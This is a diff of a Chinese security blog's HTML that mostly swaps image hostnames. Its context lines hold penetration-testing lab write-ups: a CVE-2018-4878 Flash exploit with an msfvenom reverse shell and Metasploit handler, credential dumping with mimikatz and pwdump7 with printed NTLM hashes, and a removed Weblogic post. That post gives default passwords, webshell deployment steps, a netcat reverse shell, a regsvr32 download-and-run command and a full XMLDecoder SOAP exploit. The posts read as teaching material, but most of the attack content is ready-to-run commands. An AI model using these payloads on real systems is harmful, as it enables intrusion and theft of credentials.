@@ -328,48 +328,48 @@
       
         <h1 id="Adobe远程代码执行漏洞-CVE-2018-4878"><a href="#Adobe远程代码执行漏洞-CVE-2018-4878" class="headerlink" title="Adobe远程代码执行漏洞-CVE-2018-4878"></a>Adobe远程代码执行漏洞-CVE-2018-4878</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&emsp;&emsp;2018年2月1日， Adobe官方发布了Adobe Flash Player系列产品的安全通告（APSA18-01），一个最新的Adobe Flash零日漏洞被发现针对韩国地区的人员发起攻击，该0day漏洞编号为CVE-2018-4878，目前最新版本28.0.0.137及其以前版本的Adobe Flash Player均受漏洞影响，Adobe官方将于2月5日发布漏洞补丁。CVE-2018-4878的被用于针对Windows用户的有限的针对性攻击。这些攻击利用通过电子邮件分发嵌入式恶意Flash内容的Office文档。    </p>
 <p>&emsp;&emsp;如下图所示影响 Flash Player28.0.0.137以及之前的所有版本 </p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/gmdcKDH43c.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180728/gmdcKDH43c.png?imageslim" alt="mark"></p>
 <p><a href="https://helpx.adobe.com/security/products/flash-player/apsa18-01.html" target="_blank" rel="noopener">https://helpx.adobe.com/security/products/flash-player/apsa18-01.html</a></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="第一步-生成payload"><a href="#第一步-生成payload" class="headerlink" title="第一步 生成payload"></a>第一步 生成payload</h3><p>进入CVE-2018-4878-payload目录中</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/IjKa0j63b4.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180728/IjKa0j63b4.png?imageslim" alt="mark"></p>
 <p>用msfvenom生成python语言的shellcode。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.11 lport=8118  -f  python&gt;shellcode.txt</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shellcode.txt</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/Fb2KLdG5E9.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180728/Fb2KLdG5E9.png?imageslim" alt="mark"></p>
 <p>生成目录如下图所示（如需更改vim编辑）：</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/3i5J1f12a2.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180728/3i5J1f12a2.png?imageslim" alt="mark"></p>
 <p>把使用实验环境所给的tmp.py文件追加到已经把shellcode.txt改名为payload.py文件中。得到最终的payload.py才是我们的攻击完整的程序。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp shellcode.txt payload.py</span><br><span class="line">cat tmp.py &gt;&gt;payload.py</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/gdL4GdLd91.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180728/gdL4GdLd91.png?imageslim" alt="mark"></p>
 <p>payload.py 文件部分如下，可以根据情况更改：</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/eii5iA38Lf.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180728/eii5iA38Lf.png?imageslim" alt="mark"></p>
 <p>执行我们的攻击程序payload.py。生成exploit.swf与index.html文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python payload.py</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/b3E49AAmIC.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180728/b3E49AAmIC.png?imageslim" alt="mark"></p>
 <p>接下来开启apache服务也就是我们的Web服务诱导目标用户访问。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service apache2 start</span><br></pre></td></tr></table></figure>
 <p>sudo  需要输入密码 为360College</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/Jbc72gJC5f.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180728/Jbc72gJC5f.png?imageslim" alt="mark"></p>
 <p>可以看到Apache服务开启。我们再吧index.html与exploit.swf文件复制到/var/www/html目录下也就是Apache服务器的web访问目录，使用户可以访问我们的这些文件，从而漏洞利用。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp index.html /var/www/html/index2.html </span><br><span class="line">sudo cp exploit.swf /var/www/html/exploit.swf</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/B6a878HdA2.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180728/B6a878HdA2.png?imageslim" alt="mark"></p>
 <h3 id="第二步-Metasploit-利用"><a href="#第二步-Metasploit-利用" class="headerlink" title="第二步 Metasploit 利用"></a>第二步 Metasploit 利用</h3><p>启动Metasploit，执行以下命令，监听端口，等待目标上钩，反弹shell到kali攻击机。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.0.11 [攻击机IP地址]</span><br><span class="line">set lport 8118</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/G3lj8ieiIm.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180728/G3lj8ieiIm.png?imageslim" alt="mark"></p>
 <h3 id="第三步-靶机上钩"><a href="#第三步-靶机上钩" class="headerlink" title="第三步 靶机上钩"></a>第三步 靶机上钩</h3><p>在靶机上，安装Adobe Flash Player软件。点击安装，下一步即可安装。</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/Gb7laaD5D9.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180728/Gb7laaD5D9.png?imageslim" alt="mark"></p>
 <p>安装成功。</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/358k6HgECj.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180728/358k6HgECj.png?imageslim" alt="mark"></p>
 <p>打开IE浏览器。</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/6LB724akc2.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180728/6LB724akc2.png?imageslim" alt="mark"></p>
 <p>在IE浏览器上输入。kali攻击机IP地址</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.11   [kali攻击机IP地址]</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/1Dijdmkmdb.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180728/1Dijdmkmdb.png?imageslim" alt="mark"></p>
 <h3 id="第三步-后渗透阶段"><a href="#第三步-后渗透阶段" class="headerlink" title="第三步 后渗透阶段"></a>第三步 后渗透阶段</h3><p>靶机在输入kali攻击机IP地址后，在kali攻击机中的msf可以看到。成功反弹靶机shell。</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/eb1eAiIf0i.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180728/eb1eAiIf0i.png?imageslim" alt="mark"></p>
 <p>得到meterpreter，输入sysinfo看到靶机的系统信息。可进一步的渗透。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/Ekk6ElEma1.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180728/Ekk6ElEma1.png?imageslim" alt="mark"></p>
 
       
     </div>
@@ -423,19 +423,19 @@
 <h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="1、使用-mimikatz-获取明文密码"><a href="#1、使用-mimikatz-获取明文密码" class="headerlink" title="1、使用 mimikatz 获取明文密码"></a>1、使用 mimikatz 获取明文密码</h3><p>​    mimikatz是一款功能强大的轻量级调试神器，提升进程权限注入进程读取进程内存，使用 mimikatz 获取明文密码。</p>
 <p>首先用管理员身份打开命令终端窗口cmd。</p>
 <p>&emsp;&emsp;使用 mimikatz 获取明文密码，用管理员身份打开命令终端窗口cmd。</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180726/98dcfjKm8h.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180726/98dcfjKm8h.png?imageslim" alt="mark"></p>
 <p>点击确定</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180726/AhE26DIjKL.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180726/AhE26DIjKL.png?imageslim" alt="mark"></p>
 <p>复制目录文件，到桌面下mimikatz_trunk目录下的Win32目录下并执行mimikatz命令。</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180726/gH1A7ge6mm.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180726/gH1A7ge6mm.png?imageslim" alt="mark"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Users\college\Desktop\mimikatz_trunk\Win32</span><br><span class="line">mimikatz</span><br></pre></td></tr></table></figure>
 <p>执行mimikatz命令后可看到进入mimikatz软件交互界面。</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180726/89JG2djG92.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180726/89JG2djG92.png?imageslim" alt="mark"></p>
 <p>进入mimikatz软件交互界面后执行以下命令。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180726/DHc1fJI62K.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180726/DHc1fJI62K.png?imageslim" alt="mark"></p>
 <p>如图所示得到明文密码，另SHA1密码可在线破解</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180726/gb1Ba8L4J4.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180726/gb1Ba8L4J4.png?imageslim" alt="mark"></p>
 <h3 id="2、使用-pwdump7-获取密码NTLM-hash"><a href="#2、使用-pwdump7-获取密码NTLM-hash" class="headerlink" title="2、使用 pwdump7 获取密码NTLM hash"></a>2、使用 pwdump7 获取密码NTLM hash</h3><p>NTLM hash是指Windows系统下Security Account Manager中保存的用户密码hash</p>
 <p>该NTLM hash的生成方法：</p>
 <ol>
@@ -447,11 +447,11 @@
 </li>
 </ol>
 <p>同上一个实验，进入管理员cmd，进入pwdump7 目录，执行以下命令，可得到本地NTLM hash。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cd C:\Users\college\Desktop\pwdump7</span><br><span class="line"></span><br><span class="line">pwdump7</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180726/8bH8Ca0h0d.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180726/8bH8Ca0h0d.png?imageslim" alt="mark"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">college:1000:NO PASSWORD*********************:7C70A81C7C5882C24298D391FD397885:::</span><br><span class="line">user:1001:NO PASSWORD*********************:57D583AA46D571502AAD4BB7AEA09C70:::</span><br></pre></td></tr></table></figure>
 <p>可在线破解NTLM 密码</p>
 <p><a href="http://www.cmd5.com/" target="_blank" rel="noopener">http://www.cmd5.com/</a></p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180726/76C0ak8f29.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180726/76C0ak8f29.png?imageslim" alt="mark"></p>
 <h2 id="思考与总结"><a href="#思考与总结" class="headerlink" title="思考与总结"></a>思考与总结</h2><p>&emsp;&emsp;通过本次实验，成功实现了Windows 下密码的抓取与剖解，了解windows系统密码Hash 相关知识。</p>
 
       
@@ -629,146 +629,6 @@
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web应用安全/">Web应用安全</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-中间件安全-Weblogic漏洞利用与安全加固"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2018/01/13/中间件安全-Weblogic漏洞利用与安全加固/">Weblogic漏洞利用与安全加固</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2018/01/13/中间件安全-Weblogic漏洞利用与安全加固/" class="article-date">
-	  <time datetime="2018-01-13T15:53:56.000Z" itemprop="datePublished">2018-01-13</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>  WebLogic是美国bea公司出品的一个application server，确切的说是一个基于Javaee架构的中间件，纯java开发的，最新版本WebLogic Server 12cR2 (12.2.1.3)(截至发文前)是迄今为止发布的最卓越的BEA应用服务器。BEA WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。完全遵循J2EE 1.4规范。</p>
-<p>安装：<a href="https://blog.csdn.net/acmman/article/details/70093877" target="_blank" rel="noopener">https://blog.csdn.net/acmman/article/details/70093877</a></p>
-<h2 id="0x01漏洞利用"><a href="#0x01漏洞利用" class="headerlink" title="0x01漏洞利用"></a>0x01漏洞利用</h2><h3 id="1、-默认管理控制台入口"><a href="#1、-默认管理控制台入口" class="headerlink" title="1、    默认管理控制台入口,"></a>1、    默认管理控制台入口,</h3><p>端口扫描 + web 搜索引擎 + 空间搜索引擎</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -Pn -v --open -p 80,7000-10000 192.168.3.195	考虑到精度,建议直接在目标 C 段跑,weblogic 默认端口为 7001,但通常情况下都会被目标管理员改掉,所以实战中端口最好稍微放大点</span><br></pre></td></tr></table></figure>
-<p>如何精确识别 weblogic 版本是否在漏洞范围内,其实在控制台入口页面的左下角就有详细显示</p>
-<h3 id="2、部署War包传Webshell"><a href="#2、部署War包传Webshell" class="headerlink" title="2、部署War包传Webshell"></a>2、部署War包传Webshell</h3><p>1)    常见 weblogic 入口弱口令列表如下,</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">administrator:password </span><br><span class="line">weblogic:password </span><br><span class="line">weblogic:weblogic </span><br><span class="line">weblogic:weblogic1 </span><br><span class="line">weblogic:welcome1 </span><br><span class="line">weblogic:Oracle@123 </span><br><span class="line">system:weblogic </span><br><span class="line">system:password </span><br><span class="line">system:security </span><br><span class="line">system:system </span><br><span class="line">portaladmin:portaladmin</span><br><span class="line">wlcsystem:wlcsystem </span><br><span class="line">wlpisystem:wlpisystem </span><br><span class="line">admin:security</span><br><span class="line">joe:password</span><br><span class="line">guest:guest</span><br></pre></td></tr></table></figure>
-<p>2)    当我们登录成功后,就可以立即尝试部署自己的 war 包 webshell 了,以下方法对于 weblogic 10.x - 12.x 版本几乎通用,具体如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">首先,登到 weblogic 控制台中,点击&apos; 锁定并编辑&apos; -&gt; &apos; 部署&apos;</span><br><span class="line"></span><br><span class="line">选择 &apos;安装&apos;</span><br><span class="line"></span><br><span class="line">选中自己事先准备好的 war 包 webshell [ 依然还是用我们之前文章中的那个 war 包 ],选择第一项 &apos;将部署上载到管理服务器&apos;,然后点击下一步</span><br><span class="line"></span><br><span class="line">根据提示可以看到, 此时我们的 war 包已经上传成功了,就在如下的目录中,继续...</span><br><span class="line"></span><br><span class="line">给该部署命名,此处为了防止出问题,建议保持默认</span><br><span class="line"></span><br><span class="line">点击&apos; 完成&apos;后,会提示 &apos;设置更新成功&apos;</span><br><span class="line"></span><br><span class="line">此时再次回到&apos;部署&apos;选项中,选中刚刚部署的 cmd 应用程序,点击&apos;启动&apos;服务,注意,此处一定要来自己手工启动服务,不然 shell 是部署不上的</span><br><span class="line"></span><br><span class="line">选择&apos; 是&apos;</span><br></pre></td></tr></table></figure>
-<p>看到上面提示已启动部署,此时再用浏览器访问 http://[本地IP]:7001/cmd/cmd.jsp 就可以看到我们的 shell 了,如下</p>
-<h3 id="3、-Weblogic远程代码执行漏洞-CVE-2018-2893"><a href="#3、-Weblogic远程代码执行漏洞-CVE-2018-2893" class="headerlink" title="3、   Weblogic远程代码执行漏洞[CVE-2018-2893]"></a>3、   Weblogic远程代码执行漏洞[CVE-2018-2893]</h3><p><strong><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html</a></strong></p>
-<blockquote>
-<ul>
-<li>Weblogic 10.3.6.0</li>
-<li>Weblogic 12.1.3.0</li>
-<li>Weblogic 12.2.1.2</li>
-<li>Weblogic 12.2.1.3</li>
-</ul>
-</blockquote>
-<p>漏洞验证</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve-2018-2893-test.py [目标IP] 7001</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-cve-2018-2893.jar JRMPClient4 &quot;[本地IP]:1099&quot; &gt; shell.cer</span><br><span class="line">java -cp ysoserial-cve-2018-2893.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 &quot;mshta.exe [本地IP] /options.hta&quot;</span><br></pre></td></tr></table></figure>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python weblogic.py [目标IP] 7001 shell.cer	在远程目标机器上执行该 payload</span><br></pre></td></tr></table></figure>
-<h3 id="4、反序列化远程代码执行-CVE-2018-2628"><a href="#4、反序列化远程代码执行-CVE-2018-2628" class="headerlink" title="4、反序列化远程代码执行 [CVE-2018-2628]"></a>4、反序列化远程代码执行 [CVE-2018-2628]</h3><p>基本原理：由于 weblogic 对于 T3 协议发送的数据包没有过滤,注册一个 RMI 接口,通过 T3 协议建立连接,加载回来再一步步解包,利用 readObject 解析,从而造成了反序列化远程代码执行 </p>
-<blockquote>
-<p>影 响 版 本 :</p>
-<p>Weblogic 10.3.6.0<br>Weblogic 12.1.3.0<br>Weblogic 12.2.1.2<br>Weblogic 12.2.1.3</p>
-</blockquote>
-<p><strong>漏洞验证</strong></p>
-<p>依然是先快速验证下目标是否存在此漏洞 [ 注意,目标如果用的是非默认的 7001 端口,则需要自行到脚本中去稍微改下 ]:</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 ' regsvr32 /s /n /u /i:http://192.168.3.14:8080/PhgWw1pQB6uBg.sct scrobj.dll'</span><br><span class="line"><span class="meta">#</span>win 平台反弹 meterpreter</span><br><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.3.233 110 &gt;/tmp/f'</span><br><span class="line"><span class="meta">#</span>linux反弹bash</span><br></pre></td></tr></table></figure>
-<p>看到会话回来此处就可以立即 ctrl + c 了,很显然,既然可以弹 meterpreter,那也就一定可以弹 beacon。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2018-2628-exploit.py [目标IP] 7001 ysoserial.jar 192.168.3.14 1099 JRMPClient</span><br></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery msf &gt; set target 3</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns msf &gt; set lhost 192.168.3.14</span><br><span class="line">msf &gt; set lport 53</span><br><span class="line">msf &gt; set rc4password klionsec msf &gt; exploit –j</span><br><span class="line">msf &gt; sessions -i 1</span><br><span class="line">meterpreter &gt; sysinfo meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
-<h3 id="5、反序列化-CVE-2017-10271"><a href="#5、反序列化-CVE-2017-10271" class="headerlink" title="5、反序列化[CVE-2017-10271]"></a>5、反序列化[CVE-2017-10271]</h3><p>漏洞基本原理：即 wls wsat 模块的 RCE,究其底层其实还是 XMLDecoder 的反序列化漏洞 </p>
-<p><strong>poc</strong>：<a href="https://github.com/hanc00l/weblogic_wls_wsat_rce" target="_blank" rel="noopener">https://github.com/hanc00l/weblogic_wls_wsat_rce</a> </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python weblogic_wls_wsat_exp.py -t 172.16.80.131:7001</span><br></pre></td></tr></table></figure>
-<p><strong>poc</strong>：</p>
-<p><a href="http://www.bugsafe.cn/archives/136.html" target="_blank" rel="noopener">http://www.bugsafe.cn/archives/136.html</a></p>
-<p>首先,快速验证目标是否存在此漏洞,浏览器访问 poc url : /wls-wsat/CoordinatorPortType 看到类似下面的返回则说明目标机器可能存在此漏洞<br>http://[目标IP] /wls-wsat/CoordinatorPortType    </p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/181017/aLlLklAHla.png?imageslim" alt="mark"></p>
-<p>而后,直接把下面的请求贴到 burpsuite 的 repeater 模块中进行请求,以此在目标机器上触发漏洞并执行我们的 payload,具体如下</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.3.195</span><br><span class="line">Accept-Encoding: identity Content-Length: 695</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3</span><br><span class="line">Connection: keep-alive Cache-Control: max-age=0</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span><br><span class="line">&lt;java version="1.8.0_131" class="java.beans.XMLDecoder"&gt;</span><br><span class="line">&lt;void class="java.lang.ProcessBuilder"&gt;</span><br><span class="line">&lt;array class="java.lang.String" length="3"&gt;</span><br><span class="line">&lt;void index="0"&gt;</span><br><span class="line">&lt;string&gt;cmd.exe&lt;/string&gt; #于执行 payload 代码的命令解释器,如果是在 linux 中,此处通常应该为/bin/bash</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="1"&gt;</span><br><span class="line">&lt;string&gt;/c&lt;/string&gt; #不交互,在 linux 下的选项写法为-c</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="2"&gt;</span><br><span class="line"><span class="meta">string&gt;</span>regsvr32 /s /n /u /i:http://192.168.3.14:8080/PhgWw1pQB6uBg.sct scrobj.dll&lt;/string&gt;	实际要执行的 payload 代码,直接远程下载执行,linux 中可以用 wget 或者 curl,然后管道交给 bash 去执行</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method="start"/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
-<p>点击’go’ 之后便 meterpreter 已正常回连</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery msf &gt; set target 3</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns </span><br><span class="line">msf &gt; set lhost 192.168.3.14</span><br><span class="line">msf &gt; set lport 53</span><br><span class="line">msf &gt; set rc4password klionsec msf &gt; exploit -j</span><br></pre></td></tr></table></figure>
-<p><strong>msf模块</strong></p>
-<p>exploit/multi/http/oracle_weblogic_wsat_deserialization_rce    </p>
-<h3 id="6、-反序列化-CVE-2017-3248"><a href="#6、-反序列化-CVE-2017-3248" class="headerlink" title="6、    反序列化[CVE-2017-3248]"></a>6、    反序列化[CVE-2017-3248]</h3><blockquote>
-<p>影 响 版 本 : Weblogic 10.3.6.0<br>Weblogic 12.1.3.0<br>Weblogic 12.2.1.0<br>Weblogic 12.2.1.1</p>
-</blockquote>
-<p>指定目标目标 weblogic 的 ip 端口和 JRMP 监听器的 ip [实战中肯定会直接放到自己的 vps 上搞] 端口[回连下载自己 payload 用的]</p>
